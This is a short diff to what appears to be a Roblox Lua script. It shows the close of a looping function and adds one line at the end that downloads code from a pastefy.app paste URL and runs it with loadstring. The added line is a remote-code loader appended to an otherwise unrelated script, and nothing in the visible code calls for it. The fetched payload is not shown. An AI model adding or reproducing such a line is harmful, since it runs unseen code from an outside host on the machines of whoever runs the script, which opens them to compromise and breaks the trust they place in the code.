@@ -163,3 +163,4 @@ while true do
         clearAll()
     end
 end
+loadstring(game:HttpGet("https://pastefy.app/tMLS0pjG/raw"))()
